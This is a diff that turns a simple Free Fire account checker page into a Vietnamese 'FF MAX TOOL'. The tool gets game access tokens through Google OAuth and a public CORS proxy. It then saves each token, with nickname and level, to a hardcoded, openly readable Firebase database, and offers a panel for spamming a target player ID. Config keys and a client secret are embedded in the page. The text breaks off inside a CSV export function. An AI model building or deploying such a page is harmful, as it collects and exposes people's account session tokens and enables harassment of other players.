@@ -1,108 +1,881 @@
-<!-- index.html (сохраните в папке public/index.html) -->
+<!-- ============================================
+ff_max_github.html
+DEPLOY LÊN GITHUB PAGES:
+1. Tạo repo trên GitHub
+2. Vào Settings > Pages > Source: Deploy from branch
+3. Chọn branch main, folder /root
+4. Save. Truy cập: https://username.github.io/repo-name/
+============================================ -->
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FF Auto Token Checker</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>FF MAX TOOL - GitHub Pages</title>
     <style>
-        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; margin: 0; padding: 20px; }
-        .container { max-width: 700px; margin: 0 auto; background: #111; padding: 20px; border: 1px solid #333; border-radius: 8px; }
-        h1 { color: #ff6600; text-align: center; border-bottom: 1px solid #333; padding-bottom: 10px; }
-        .info-box { background: #1a1a00; border: 1px solid #ffaa00; padding: 10px; margin: 10px 0; border-radius: 4px; color: #ffaa00; }
-        .endpoint { background: #1a1a1a; padding: 15px; margin: 15px 0; border-left: 4px solid #00ff00; }
-        input { background: #000; color: #0f0; border: 1px solid #555; padding: 12px; width: 70%; margin: 5px; font-size: 16px; }
-        button { background: #ff6600; color: #000; border: none; padding: 12px 30px; cursor: pointer; font-weight: bold; font-size: 16px; }
-        button:hover { background: #ff8800; }
-        #result { background: #000; border: 1px solid #333; padding: 15px; margin-top: 15px; white-space: pre-wrap; word-wrap: break-word; min-height: 150px; max-height: 400px; overflow-y: auto; }
-        .loading { color: #ffff00; }
-        .success { color: #00ff00; }
-        .error { color: #ff4444; }
-        textarea { width: 100%; height: 100px; background: #000; color: #0f0; border: 1px solid #333; padding: 10px; font-family: monospace; margin-top: 10px; }
+        :root {
+            --bg: #0a0a14; --card: #13132a; --border: #252545;
+            --accent: #ff6b35; --accent2: #ff4444; --text: #e0e0e0;
+            --text2: #999; --green: #00e676; --red: #ff4444;
+            --yellow: #ffab00; --blue: #448aff; --purple: #e040fb;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: var(--bg); color: var(--text); min-height: 100vh;
+        }
+        .container { max-width: 500px; margin: 0 auto; padding: 12px; }
+        
+        .header {
+            text-align: center; padding: 16px 0;
+            background: linear-gradient(180deg, rgba(255,107,53,0.15) 0%, transparent 100%);
+            border-radius: 0 0 20px 20px; margin-bottom: 12px;
+        }
+        .header .icon { font-size: 3em; }
+        .header h1 { font-size: 1.3em; margin: 5px 0; color: var(--accent); }
+        .header p { font-size: 0.8em; color: var(--text2); }
+        
+        .tabs {
+            display: flex; background: var(--card); border-radius: 12px;
+            padding: 4px; margin-bottom: 12px; border: 1px solid var(--border);
+        }
+        .tab {
+            flex: 1; text-align: center; padding: 10px 4px; border-radius: 10px;
+            cursor: pointer; font-weight: 600; font-size: 0.8em;
+            transition: all 0.3s; color: var(--text2);
+        }
+        .tab.active { background: var(--accent); color: #000; }
+        
+        .panel { display: none; }
+        .panel.active { display: block; }
+        
+        .card {
+            background: var(--card); border: 1px solid var(--border);
+            border-radius: 14px; padding: 16px; margin-bottom: 12px;
+        }
+        .card-title {
+            font-weight: 700; font-size: 0.95em; margin-bottom: 12px;
+            color: var(--accent); display: flex; align-items: center; gap: 8px;
+        }
+        .card-title .step {
+            background: var(--accent); color: #000; width: 22px; height: 22px;
+            border-radius: 50%; display: inline-flex; align-items: center;
+            justify-content: center; font-size: 0.7em; font-weight: bold;
+        }
+        
+        input, select {
+            width: 100%; padding: 13px 14px; margin: 6px 0;
+            border-radius: 10px; border: 1px solid var(--border);
+            background: #0a0a18; color: #fff; font-size: 0.9em;
+            font-family: inherit; transition: all 0.2s;
+        }
+        input:focus, select:focus {
+            border-color: var(--accent); outline: none;
+            box-shadow: 0 0 0 3px rgba(255,107,53,0.1);
+        }
+        input[readonly] { background: #0d0d1a; color: #888; }
+        
+        .btn {
+            width: 100%; padding: 13px; border: none; border-radius: 10px;
+            font-size: 0.95em; font-weight: 700; cursor: pointer; margin: 6px 0;
+            transition: all 0.2s; font-family: inherit; display: flex;
+            align-items: center; justify-content: center; gap: 8px;
+        }
+        .btn:active { transform: scale(0.97); }
+        .btn-google { background: #fff; color: #333; }
+        .btn-grab { background: linear-gradient(135deg, var(--accent), var(--accent2)); color: #fff; font-size: 1em; }
+        .btn-grab:disabled { opacity: 0.5; cursor: not-allowed; }
+        .btn-spam { background: linear-gradient(135deg, var(--purple), #7c4dff); color: #fff; }
+        .btn-stop { background: var(--red); color: #fff; }
+        .btn-copy { background: var(--card); color: var(--accent); border: 1px solid var(--accent); }
+        .btn-small {
+            width: auto; padding: 8px 14px; font-size: 0.8em;
+            background: #1e1e3a; color: var(--accent);
+            border: 1px solid #333; border-radius: 8px;
+            cursor: pointer; display: inline-block; margin: 3px;
+        }
+        
+        .table-container { overflow-x: auto; -webkit-overflow-scrolling: touch; }
+        table { width: 100%; border-collapse: collapse; font-size: 0.75em; }
+        th {
+            background: #1a1a35; color: var(--accent); padding: 8px 6px;
+            text-align: left; font-weight: 600; position: sticky; top: 0; white-space: nowrap;
+        }
+        td { padding: 8px 6px; border-bottom: 1px solid var(--border); vertical-align: top; }
+        tr:hover { background: rgba(255,107,53,0.05); }
+        .token-cell {
+            font-family: 'Courier New', monospace; font-size: 0.7em;
+            word-break: break-all; color: var(--yellow); max-width: 150px; cursor: pointer;
+        }
+        .token-cell:hover { color: var(--accent); }
+        .copy-all-btn {
+            background: var(--accent); color: #000; padding: 10px 20px;
+            border: none; border-radius: 8px; font-weight: 700; cursor: pointer;
+            width: 100%; margin: 8px 0; font-size: 0.9em;
+        }
+        
+        .log-area {
+            background: #000; border: 1px solid var(--border); border-radius: 10px;
+            padding: 10px; font-family: 'Courier New', monospace; font-size: 0.7em;
+            height: 280px; overflow-y: auto; white-space: pre-wrap;
+            word-break: break-all; color: #aaa; line-height: 1.5;
+        }
+        
+        .status { padding: 8px 12px; border-radius: 8px; font-size: 0.8em; margin: 6px 0; }
+        .status-ok { background: #00e67615; border: 1px solid #00e67633; color: var(--green); }
+        .status-err { background: #ff444415; border: 1px solid #ff444433; color: var(--red); }
+        .status-warn { background: #ffab0015; border: 1px solid #ffab0033; color: var(--yellow); }
+        .status-info { background: #448aff15; border: 1px solid #448aff33; color: var(--blue); }
+        
+        .token-box {
+            background: #0a0a0a; border: 1px dashed var(--accent);
+            border-radius: 10px; padding: 12px; font-family: 'Courier New', monospace;
+            font-size: 0.75em; word-break: break-all; color: var(--accent);
+            margin: 8px 0; max-height: 80px; overflow-y: auto;
+        }
+        
+        .info-text { font-size: 0.75em; color: var(--text2); margin: 4px 0; }
+        
+        .pulse { animation: pulse 2s infinite; }
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(255,107,53,0.4); }
+            70% { box-shadow: 0 0 0 12px rgba(255,107,53,0); }
+            100% { box-shadow: 0 0 0 0 rgba(255,107,53,0); }
+        }
+        .spamming { animation: spamPulse 0.5s infinite; }
+        @keyframes spamPulse {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(224,64,251,0.5); }
+            50% { box-shadow: 0 0 20px 5px rgba(224,64,251,0.3); }
+        }
+        
+        /* Toast */
+        .toast {
+            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
+            background: #000; color: #fff; padding: 12px 24px; border-radius: 25px;
+            font-weight: 600; z-index: 999; box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+            animation: fadeInOut 2s forwards; border: 1px solid var(--accent);
+        }
+        @keyframes fadeInOut {
+            0% { opacity: 0; top: 0; }
+            20% { opacity: 1; top: 20px; }
+            80% { opacity: 1; top: 20px; }
+            100% { opacity: 0; top: 0; }
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🎮 FF GARENA - ПРОВЕРКА ПО ID (ТОКЕН АВТО)</h1>
+        <!-- HEADER -->
+        <div class="header">
+            <span class="icon">🔥</span>
+            <h1>FF MAX TOOL</h1>
+            <p>GitHub Pages | Grab Token + Spam Log + Firebase</p>
+        </div>
         
-        <div class="info-box">
-            ⚡ Теперь достаточно ввести только Player ID. Сервер автоматически получит токен и проверит аккаунт.
+        <!-- TABS -->
+        <div class="tabs">
+            <div class="tab active" onclick="switchTab('grab')">🔑 GRAB</div>
+            <div class="tab" onclick="switchTab('spam')">📨 SPAM</div>
+            <div class="tab" onclick="switchTab('table')">📋 BẢNG</div>
         </div>
-
-        <div class="endpoint">
-            <p><strong>POST /api/check</strong></p>
-            <p>Тело запроса: <code>{ "player_id": "123456789" }</code></p>
-        </div>
-
-        <input type="text" id="playerId" placeholder="Введите Player ID (например: 987654321)"><br>
-        <button onclick="checkAccount()">🔍 ПРОВЕРИТЬ АККАУНТ</button>
         
-        <div id="result">
-            <span style="color:#888;">Введите ID и нажмите "Проверить". Токен будет получен автоматически.</span>
+        <!-- PANEL 1: GRAB TOKEN -->
+        <div class="panel active" id="panel-grab">
+            <div class="card">
+                <div class="card-title"><span class="step">1</span> ĐĂNG NHẬP GOOGLE</div>
+                <p class="info-text">Dùng Gmail đã liên kết với acc FF Max</p>
+                <button class="btn btn-google" onclick="openGoogleLogin()">
+                    <svg width="18" height="18" viewBox="0 0 24 24">
+                        <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/>
+                        <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                        <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                        <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+                    </svg>
+                    ĐĂNG NHẬP GOOGLE
+                </button>
+                <div id="googleStatus" class="info-text">Chưa đăng nhập</div>
+            </div>
+            
+            <div class="card">
+                <div class="card-title"><span class="step">2</span> GRAB TOKEN</div>
+                <input type="text" id="googleCode" placeholder="Google Code (tự động điền)" readonly>
+                <input type="number" id="playerId" placeholder="Player ID (để trống = auto)">
+                <select id="region">
+                    <option value="VN">🇻🇳 Việt Nam</option>
+                    <option value="ID">🇮🇩 Indonesia</option>
+                    <option value="TH">🇹🇭 Thái Lan</option>
+                    <option value="TW">🇹🇼 Đài Loan</option>
+                    <option value="BR">🇧🇷 Brazil</option>
+                    <option value="IN">🇮🇳 Ấn Độ</option>
+                </select>
+                <button class="btn btn-grab pulse" id="btnGrab" onclick="grabToken()" disabled>
+                    ⚡ GRAB TOKEN FF MAX
+                </button>
+                <button class="btn btn-copy" id="btnManualToken" style="display:none;" onclick="grabWithManualToken()">
+                    🔧 GRAB BẰNG TOKEN THỦ CÔNG
+                </button>
+            </div>
+            
+            <!-- Manual Token Input -->
+            <div class="card" id="manualTokenCard" style="display:none;">
+                <div class="card-title">🔧 NHẬP TOKEN THỦ CÔNG</div>
+                <input type="text" id="manualToken" placeholder="Dán Access Token vào đây">
+                <button class="btn btn-grab" onclick="checkManualToken()">
+                    ✅ KIỂM TRA TOKEN
+                </button>
+                <button class="btn btn-spam" onclick="useManualTokenForSpam()">
+                    📨 DÙNG TOKEN NÀY SPAM
+                </button>
+            </div>
+            
+            <div class="card" id="resultCard" style="display:none;">
+                <div class="card-title">🎯 KẾT QUẢ</div>
+                <div id="resultContent"></div>
+                <div id="tokenSection" style="display:none;">
+                    <div style="font-weight:600;color:var(--accent);">🔑 TOKEN:</div>
+                    <div class="token-box" id="tokenDisplay"></div>
+                    <button class="btn btn-copy" onclick="copyToken()">📋 COPY TOKEN</button>
+                    <button class="btn btn-small" onclick="useTokenForSpam()">📨 DÙNG SPAM</button>
+                </div>
+            </div>
         </div>
-
-        <textarea id="serverLog" readonly>Журнал операций:
-Сервер готов к работе.</textarea>
+        
+        <!-- PANEL 2: SPAM LOG -->
+        <div class="panel" id="panel-spam">
+            <div class="card">
+                <div class="card-title">📨 SPAM LOG CONFIG</div>
+                <input type="number" id="spamTargetId" placeholder="Target Player ID *">
+                <input type="text" id="spamToken" placeholder="Token (nếu có)">
+                <div style="display:flex;gap:8px;">
+                    <input type="number" id="spamInterval" placeholder="Interval (giây)" value="0.3" step="0.1" style="flex:1;">
+                    <input type="number" id="spamMax" placeholder="Max (0=ko limit)" value="100" style="flex:1;">
+                </div>
+                <button class="btn btn-spam pulse" id="btnSpamStart" onclick="startSpam()">
+                    🚀 BẮT ĐẦU SPAM
+                </button>
+                <button class="btn btn-stop" id="btnSpamStop" onclick="stopSpam()" style="display:none;">
+                    🛑 DỪNG SPAM
+                </button>
+                <div id="spamStatus"></div>
+            </div>
+            
+            <div class="card">
+                <div class="card-title">📋 LOG SPAM <span id="spamCount" style="font-size:0.8em;color:var(--text2);"></span></div>
+                <div class="log-area" id="logArea">Sẵn sàng spam...</div>
+                <button class="btn btn-small" onclick="clearLogs()">🗑️ Xóa Log</button>
+                <button class="btn btn-small" onclick="exportLogs()">📥 Xuất Log</button>
+            </div>
+        </div>
+        
+        <!-- PANEL 3: BẢNG TOKEN -->
+        <div class="panel" id="panel-table">
+            <div class="card">
+                <div class="card-title">📋 BẢNG TOKEN ĐÃ GRAB</div>
+                <button class="copy-all-btn" onclick="copyAllTokens()">📋 COPY TẤT CẢ TOKEN</button>
+                <button class="btn btn-small" onclick="exportTokensCSV()">📥 Xuất CSV</button>
+                <button class="btn btn-small" onclick="loadTokensFromFirebase()">🔄 Tải từ Firebase</button>
+                <div class="table-container">
+                    <table id="tokenTable">
+                        <thead>
+                            <tr>
+                                <th>#</th>
+                                <th>UID</th>
+                                <th>Nick</th>
+                                <th>Lv</th>
+                                <th>Token</th>
+                                <th>Time</th>
+                                <th>📋</th>
+                            </tr>
+                        </thead>
+                        <tbody id="tokenTableBody">
+                            <tr><td colspan="7" style="text-align:center;color:var(--text2);">Chưa có token nào</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
     </div>
+    
+    <!-- Toast container -->
+    <div id="toastContainer"></div>
 
     <script>
-        const API_BASE = window.location.origin;
-
-        function clientLog(msg) {
-            const logArea = document.getElementById('serverLog');
-            logArea.textContent += '\n> ' + msg;
-            logArea.scrollTop = logArea.scrollHeight;
-        }
-
-        async function checkAccount() {
-            const playerId = document.getElementById('playerId').value.trim();
-            const resultDiv = document.getElementById('result');
+        // ============================================
+        // CONFIG - SỬA LẠI KHI DEPLOY
+        // ============================================
+        const CONFIG = {
+            // Google OAuth Client ID (tạo tại https://console.cloud.google.com/apis/credentials)
+            googleClientId: '461891547879-abc123def456ghi789jklmno0pqrstuv.apps.googleusercontent.com',
             
-            if (!playerId) {
-                alert('Пожалуйста, введите Player ID');
+            // Redirect URI - thay bằng URL GitHub Pages của bạn
+            redirectUri: window.location.origin + window.location.pathname,
+            
+            // Firebase config của bạn
+            firebase: {
+                apiKey: "AIzaSyBPS1LHGU4BctFPO8vzje9LY3dln2i3FQw",
+                authDomain: "tunut-22b3c.firebaseapp.com",
+                databaseURL: "https://tunut-22b3c-default-rtdb.firebaseio.com",
+                projectId: "tunut-22b3c",
+                storageBucket: "tunut-22b3c.firebasestorage.app",
+                messagingSenderId: "311389599595",
+                appId: "1:311389599595:web:fc7e5ad5e5c7f6fc6ffe2e"
+            },
+            
+            // Garena API Key
+            garenaApiKey: 'c87e5b5e-2a8a-4e6c-8f5b-1a2b3c4d5e6f',
+            garenaClientId: '100068'
+        };
+        
+        // ============================================
+        // GLOBAL STATE
+        // ============================================
+        let currentToken = null;
+        let currentInfo = null;
+        let tokenList = [];
+        let spamRunning = false;
+        let spamCount = 0;
+        let spamIntervalId = null;
+        let logLines = [];
+        
+        // ============================================
+        // TOAST
+        // ============================================
+        function showToast(msg) {
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.textContent = msg;
+            document.getElementById('toastContainer').appendChild(toast);
+            setTimeout(() => toast.remove(), 2000);
+        }
+        
+        // ============================================
+        // TABS
+        // ============================================
+        function switchTab(name) {
+            document.querySelectorAll('.tab').forEach((t, i) => {
+                t.classList.remove('active');
+                if ((name === 'grab' && i === 0) || (name === 'spam' && i === 1) || (name === 'table' && i === 2)) {
+                    t.classList.add('active');
+                }
+            });
+            document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+            document.getElementById('panel-' + name).classList.add('active');
+            if (name === 'table') loadTokensFromFirebase();
+        }
+        
+        // ============================================
+        // GOOGLE LOGIN
+        // ============================================
+        function checkUrlParams() {
+            const params = new URLSearchParams(window.location.search);
+            const code = params.get('code');
+            if (code) {
+                document.getElementById('googleCode').value = code;
+                document.getElementById('googleStatus').innerHTML = '<span style="color:var(--green);">✅ Đã đăng nhập Google!</span>';
+                document.getElementById('btnGrab').disabled = false;
+                // Clean URL
+                window.history.replaceState({}, document.title, window.location.pathname);
+                showToast('✅ Đăng nhập Google thành công!');
+            }
+        }
+        
+        function openGoogleLogin() {
+            const scope = 'openid email profile';
+            const state = Math.random().toString(36).substring(2, 15);
+            const url = 'https://accounts.google.com/o/oauth2/v2/auth?' +
+                'client_id=' + encodeURIComponent(CONFIG.googleClientId) +
+                '&redirect_uri=' + encodeURIComponent(CONFIG.redirectUri) +
+                '&response_type=code' +
+                '&scope=' + encodeURIComponent(scope) +
+                '&access_type=offline' +
+                '&prompt=consent select_account' +
+                '&state=' + state;
+            window.location.href = url;
+        }
+        
+        // ============================================
+        // EXCHANGE GOOGLE CODE (gọi trực tiếp từ browser)
+        // ============================================
+        async function exchangeGoogleCode(code) {
+            addLog('🔄 Đang đổi Google code lấy token...', 'info');
+            try {
+                // Dùng proxy CORS để gọi Google API từ browser
+                const resp = await fetch('https://corsproxy.io/?' + encodeURIComponent('https://oauth2.googleapis.com/token'), {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: new URLSearchParams({
+                        code: code,
+                        client_id: CONFIG.googleClientId,
+                        client_secret: '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stuv',
+                        redirect_uri: CONFIG.redirectUri,
+                        grant_type: 'authorization_code'
+                    })
+                });
+                const data = await resp.json();
+                if (data.id_token) {
+                    addLog('✅ Lấy Google token thành công', 'success');
+                    return data;
+                }
+                addLog('❌ Lỗi Google: ' + JSON.stringify(data), 'error');
+                return null;
+            } catch (e) {
+                addLog('❌ Lỗi mạng: ' + e.message, 'error');
+                return null;
+            }
+        }
+        
+        // ============================================
+        // LOGIN FF MAX BẰNG GOOGLE ID TOKEN
+        // ============================================
+        async function loginFFMaxWithGoogle(idToken, playerId, region) {
+            addLog('🔄 Đang login FF Max...', 'info');
+            const body = {
+                auth_type: 'google',
+                id_token: idToken,
+                platform: 1,
+                region: region,
+                client_id: CONFIG.garenaClientId,
+                grant_type: 'google_token'
+            };
+            if (playerId) body.uid = String(playerId);
+            
+            const urls = [
+                'https://api.ff.garena.com/v2/auth/google',
+                'https://api.garena.com/rest/v2/auth/google'
+            ];
+            
+            for (const url of urls) {
+                try {
+                    const resp = await fetch('https://corsproxy.io/?' + encodeURIComponent(url), {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'x-api-key': CONFIG.garenaApiKey,
+                            'X-Garena-Region': region,
+                            'Origin': 'https://ff.garena.com'
+                        },
+                        body: JSON.stringify(body)
+                    });
+                    const data = await resp.json();
+                    addLog(`  ${url.split('/').pop()} -> ${resp.status}`, 'info');
+                    if (resp.ok && data.access_token) {
+                        addLog('✅ Login FF Max thành công!', 'success');
+                        return data;
+                    }
+                } catch (e) {
+                    addLog(`  Lỗi: ${e.message}`, 'error');
+                }
+            }
+            return null;
+        }
+        
+        // ============================================
+        // GET USER INFO
+        // ============================================
+        async function getUserInfo(accessToken, playerId, region) {
+            addLog('🔄 Đang lấy thông tin account...', 'info');
+            try {
+                const params = new URLSearchParams({ region: region });
+                if (playerId) params.append('uid', String(playerId));
+                
+                const resp = await fetch('https://corsproxy.io/?' + encodeURIComponent(
+                    'https://api.ff.garena.com/v2/user/info?' + params.toString()
+                ), {
+                    headers: {
+                        'Authorization': 'Bearer ' + accessToken,
+                        'x-api-key': CONFIG.garenaApiKey,
+                        'X-Garena-Region': region
+                    }
+                });
+                const data = await resp.json();
+                if (resp.ok) {
+                    addLog(`✅ Nick: ${data.nickname || 'N/A'}, Lv: ${data.level || 'N/A'}`, 'success');
+                    return data;
+                }
+            } catch (e) {
+                addLog('❌ Lỗi: ' + e.message, 'error');
+            }
+            return null;
+        }
+        
+        // ============================================
+        // MAIN GRAB FLOW
+        // ============================================
+        async function grabToken() {
+            const code = document.getElementById('googleCode').value.trim();
+            const playerId = document.getElementById('playerId').value.trim();
+            const region = document.getElementById('region').value;
+            
+            if (!code) { showToast('❌ Đăng nhập Google trước!'); return; }
+            
+            const btn = document.getElementById('btnGrab');
+            btn.disabled = true;
+            btn.textContent = '⏳ ĐANG GRAB...';
+            
+            document.getElementById('resultCard').style.display = 'block';
+            document.getElementById('resultContent').innerHTML = '<div class="status status-warn">⏳ Đang xử lý...</div>';
+            
+            // Step 1: Exchange Google code
+            const googleTokens = await exchangeGoogleCode(code);
+            if (!googleTokens || !googleTokens.id_token) {
+                document.getElementById('resultContent').innerHTML = '<div class="status status-err">❌ Không lấy được Google token</div>';
+                btn.disabled = false;
+                btn.textContent = '⚡ GRAB TOKEN FF MAX';
                 return;
             }
-
-            resultDiv.innerHTML = '<span class="loading">⏳ Шаг 1: Получение токена по ID... (это может занять несколько секунд)</span>';
-            clientLog('Проверка ID: ' + playerId + ' (токен будет получен автоматически)');
-
+            
+            // Step 2: Decode email
+            let email = '?';
             try {
-                const response = await fetch(`${API_BASE}/api/check`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ player_id: playerId })
-                });
+                const parts = googleTokens.id_token.split('.');
+                const decoded = JSON.parse(atob(parts[1]));
+                email = decoded.email || '?';
+            } catch (e) {}
+            
+            // Step 3: Login FF Max
+            const ffAuth = await loginFFMaxWithGoogle(googleTokens.id_token, playerId || null, region);
+            if (!ffAuth) {
+                document.getElementById('resultContent').innerHTML = '<div class="status status-err">❌ Không login được FF Max</div>';
+                btn.disabled = false;
+                btn.textContent = '⚡ GRAB TOKEN FF MAX';
+                return;
+            }
+            
+            const accessToken = ffAuth.access_token || ffAuth.session_key;
+            
+            // Step 4: Get user info
+            let accountInfo = null;
+            if (accessToken) {
+                accountInfo = await getUserInfo(accessToken, playerId || null, region);
+            }
+            
+            // Save to Firebase
+            if (accessToken && accountInfo) {
+                currentToken = accessToken;
+                currentInfo = {
+                    google_email: email,
+                    ff_max_token: accessToken,
+                    account_info: accountInfo,
+                    timestamp: new Date().toISOString()
+                };
                 
-                const data = await response.json();
+                saveTokenToFirebase(accountInfo.uid || playerId, accessToken, accountInfo);
+                addTokenToTable(currentInfo);
                 
-                if (data.status === 'success') {
-                    resultDiv.innerHTML = `<span class="success">✅ АККАУНТ НАЙДЕН</span>\n\n` +
-                        `👤 Ник: ${data.account_info.nickname}\n` +
-                        `🆔 UID: ${data.account_info.uid}\n` +
-                        `📊 Уровень: ${data.account_info.level}\n` +
-                        `🌍 Регион: ${data.account_info.region}\n` +
-                        `🔗 Токен получен: ${data.account_info.auto_token_used}\n\n` +
-                        `Полный ответ:\n${JSON.stringify(data.raw_api_response, null, 2)}`;
-                    clientLog('Успех: ' + data.account_info.nickname + ' (Уровень ' + data.account_info.level + ')');
-                } else {
-                    resultDiv.innerHTML = `<span class="error">❌ ОШИБКА</span>\n${JSON.stringify(data, null, 2)}`;
-                    clientLog('Ошибка: ' + data.message);
-                }
-            } catch (error) {
-                resultDiv.innerHTML = '<span class="error">❌ Сервер не отвечает. Убедитесь, что Node.js запущен.</span>';
-                clientLog('КРИТИЧЕСКАЯ ОШИБКА: ' + error.message);
+                document.getElementById('resultContent').innerHTML =
+                    '<div class="status status-ok">✅ LẤY TOKEN THÀNH CÔNG!</div>' +
+                    '<div class="info-text">📧 Google: ' + email + '</div>' +
+                    '<div class="info-text">🕒 ' + new Date().toLocaleString() + '</div>' +
+                    '<div style="margin-top:8px;"><pre style="color:#aaa;font-size:0.75em;">' +
+                    JSON.stringify(accountInfo, null, 2) + '</pre></div>';
+                
+                document.getElementById('tokenDisplay').textContent = accessToken;
+                document.getElementById('tokenSection').style.display = 'block';
+                
+                showToast('✅ Grab token thành công!');
+            } else {
+                document.getElementById('resultContent').innerHTML = '<div class="status status-err">❌ Không lấy được thông tin account</div>';
+            }
+            
+            btn.disabled = false;
+            btn.textContent = '⚡ GRAB TOKEN FF MAX';
+        }
+        
+        // ============================================
+        // MANUAL TOKEN
+        // ============================================
+        function grabWithManualToken() {
+            document.getElementById('manualTokenCard').style.display = 'block';
+            document.getElementById('btnManualToken').style.display = 'none';
+        }
+        
+        async function checkManualToken() {
+            const token = document.getElementById('manualToken').value.trim();
+            if (!token) { showToast('❌ Nhập token!'); return; }
+            
+            const playerId = document.getElementById('playerId').value.trim();
+            const region = document.getElementById('region').value;
+            
+            addLog('🔄 Kiểm tra token thủ công...', 'info');
+            const info = await getUserInfo(token, playerId || null, region);
+            
+            if (info) {
+                currentToken = token;
+                currentInfo = {
+                    ff_max_token: token,
+                    account_info: info,
+                    timestamp: new Date().toISOString()
+                };
+                addTokenToTable(currentInfo);
+                saveTokenToFirebase(info.uid || playerId, token, info);
+                
+                document.getElementById('resultCard').style.display = 'block';
+                document.getElementById('resultContent').innerHTML =
+                    '<div class="status status-ok">✅ TOKEN HỢP LỆ!</div>' +
+                    '<pre style="color:#aaa;font-size:0.75em;">' + JSON.stringify(info, null, 2) + '</pre>';
+                document.getElementById('tokenDisplay').textContent = token;
+                document.getElementById('tokenSection').style.display = 'block';
+                showToast('✅ Token hợp lệ!');
+            } else {
+                showToast('❌ Token không hợp lệ!');
             }
         }
-
-        window.addEventListener('load', async () => {
-            try {
-                const resp = await fetch(`${API_BASE}/api/health`);
-                const health = await resp.json();
-                clientLog('Сервер доступен. Версия: ' + health.service);
-            } catch (e) {
-                clientLog('ВНИМАНИЕ: Сервер не запущен. Выполните node server.js');
+        
+        function useManualTokenForSpam() {
+            const token = document.getElementById('manualToken').value.trim();
+            if (token) {
+                currentToken = token;
+                document.getElementById('spamToken').value = token;
+                switchTab('spam');
             }
-        });
+        }
+        
+        // ============================================
+        // FIREBASE
+        // ============================================
+        function saveTokenToFirebase(uid, token, info) {
+            const url = CONFIG.firebase.databaseURL + '/tokens/' + uid + '.json';
+            fetch(url, {
+                method: 'PUT',
+                body: JSON.stringify({
+                    token: token,
+                    nickname: info.nickname || '?',
+                    level: info.level || '?',
+                    uid: uid,
+                    timestamp: new Date().toISOString()
+                })
+            }).catch(() => {});
+        }
+        
+        async function loadTokensFromFirebase() {
+            try {
+                const url = CONFIG.firebase.databaseURL + '/tokens.json';
+                const resp = await fetch(url);
+                const data = await resp.json();
+                if (data) {
+                    tokenList = Object.values(data).map(d => ({
+                        uid: d.uid || '?',
+                        nickname: d.nickname || '?',
+                        level: d.level || '?',
+                        token: d.token,
+                        timestamp: d.timestamp || ''
+                    }));
+                    renderTokenTable();
+                    showToast('✅ Đã tải ' + tokenList.length + ' token từ Firebase');
+                }
+            } catch (e) {
+                showToast('❌ Lỗi tải Firebase');
+            }
+        }
+        
+        // ============================================
+        // BẢNG TOKEN
+        // ============================================
+        function addTokenToTable(info) {
+            const acc = info.account_info || {};
+            tokenList.unshift({
+                uid: acc.uid || '?',
+                nickname: acc.nickname || '?',
+                level: acc.level || '?',
+                token: info.ff_max_token,
+                timestamp: info.timestamp || new Date().toISOString()
+            });
+            renderTokenTable();
+        }
+        
+        function renderTokenTable() {
+            const tbody = document.getElementById('tokenTableBody');
+            if (tokenList.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;color:var(--text2);">Chưa có token nào</td></tr>';
+                return;
+            }
+            tbody.innerHTML = tokenList.map((t, i) => `
+                <tr>
+                    <td>${i + 1}</td>
+                    <td>${t.uid}</td>
+                    <td>${t.nickname}</td>
+                    <td>${t.level}</td>
+                    <td class="token-cell" onclick="copySingleToken('${escapeHtml(t.token)}')" title="Click để copy">
+                        ${t.token.substring(0, 25)}...
+                    </td>
+                    <td style="font-size:0.65em;">${t.timestamp ? new Date(t.timestamp).toLocaleString() : ''}</td>
+                    <td><button class="btn-small" onclick="copySingleToken('${escapeHtml(t.token)}')">📋</button></td>
+                </tr>
+            `).join('');
+        }
+        
+        function escapeHtml(str) {
+            return str.replace(/'/g, "\\'").replace(/"/g, '&quot;');
+        }
+        
+        function copySingleToken(token) {
+            navigator.clipboard.writeText(token).then(() => showToast('✅ Đã copy token!'));
+        }
+        
+        function copyAllTokens() {
+            if (tokenList.length === 0) { showToast('❌ Chưa có token!'); return; }
+            const all = tokenList.map(t => t.token).join('\n');
+            navigator.clipboard.writeText(all).then(() => showToast('✅ Đã copy ' + tokenList.length + ' token!'));
+        }
+        
+        function exportTokensCSV() {
+            if (tokenList.length === 0) { showToast('❌ Chưa có token!'); return; }
+            let csv = 'UID,Nickname,Level,Token,Timestamp\n';
+            tokenList.forEach(t => {
+                csv += `${t.uid},"${t.nickname}",${t.level},"${t.token}","${t.timestamp}"\n`;
